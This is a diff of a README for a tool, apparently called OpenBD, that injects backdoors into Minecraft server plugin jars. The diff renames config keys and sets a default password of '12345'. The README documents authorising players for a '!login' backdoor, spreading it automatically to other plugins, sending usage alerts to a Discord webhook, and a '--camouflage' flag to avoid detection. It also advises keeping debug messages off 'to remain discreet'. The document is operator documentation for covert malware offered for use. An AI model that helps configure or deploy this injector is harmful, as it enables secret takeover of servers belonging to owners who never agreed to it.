@@ -19,13 +19,13 @@ Open the newly created `config.json` file and modify it to suit your needs.
 #### Default Configuration:
 ```json
 {
-  "authorized_uuids": [],
-  "authorized_usernames": [],
-  "command_prefix": "!",
-  "inject_into_other_plugins": false,
-  "display_debug_messages": false,
+  "uuids": [],
+  "usernames": [],
+  "prefix": "!",
+  "spread": false,
+  "warnings": true,
   "discord_token": "",
-  "password": ""
+  "password": "12345"
 }
 ```
 
@@ -33,31 +33,31 @@ Open the newly created `config.json` file and modify it to suit your needs.
 
 | Option | Purpose |
 | :--- | :--- |
-| `authorized_uuids` | A list of player UUIDs that are authorized to use the backdoor. |
-| `authorized_usernames` | A list of player names that are authorized to use the backdoor. |
-| `command_prefix` | The prefix for backdoor commands (e.g., `!`). |
-| `inject_into_other_plugins` | Automatically spread the backdoor to other plugins on the server. |
-| `display_debug_messages` | Display debug messages in the console. |
+| `uuids` | A list of player UUIDs that are authorized to use the backdoor. |
+| `usernames` | A list of player names that are authorized to use the backdoor. |
+| `prefix` | The prefix for backdoor commands (e.g., `!`). |
+| `spread` | Automatically spread the backdoor to other plugins on the server. |
+| `warnings` | Display debug messages in the console. |
 | `discord_token` | A Discord webhook token to send information when someone uses your injected plugin. |
 | `password` | The password required to log in to the backdoor using `!login [password]`. |
 
 #### Example of a Modified Config File:
 ```json
 {
-  "authorized_uuids": ["069a79f4-44e9-4726-a5be-fca90e38aaf5"],
-  "authorized_usernames": ["Kudo","kudo"],
-  "command_prefix": "!",
-  "inject_into_other_plugins": true,
-  "display_debug_messages": false,
+  "uuids": ["069a79f4-44e9-4726-a5be-fca90e38aaf5"],
+  "usernames": ["Kudo","kudo"],
+  "prefix": "!",
+  "spread": true,
+  "warnings": false,
   "discord_token": "YOUR_DISCORD_WEBHOOK_TOKEN_HERE",
   "password": "12345"
 }
 ```
 
 #### Helpful Tips:
-*   If both `authorized_uuids` and `authorized_usernames` are left empty, everyone on the server will see the backdoor login message but cannot use it without the password.
+*   If both `uuids` and `usernames` are left empty, everyone on the server will see the backdoor login message but cannot use it without the password.
 *   If `password` is not set, you can log in with just the `!login` command.
-*   To remain discreet, keep `display_debug_messages` set to `false`.
+*   To remain discreet, keep `warnings` set to `false`.
 
 ### Step 3: Inject the Backdoor into a Plugin
 
@@ -125,4 +125,5 @@ java -jar OpenBD.jar --inject -m single -i plugin.jar -c config.json --camouflag
 | **`--output <path>`** | `-o` | Output path. A file for `single` mode (default: `out.jar`), or a directory for `multiple` mode (default: `out`). |
 | **`--replace`** | `-r` | Replaces the input file(s) instead of creating new ones in the output path. |
 | **`--camouflage`** | | Camouflages the backdoor to avoid detection. |
+| **`--debug`** | `-db` | Display debug log | 
 | **`--trace-errors`** | `-tr` | Displays the full stack trace on errors. |
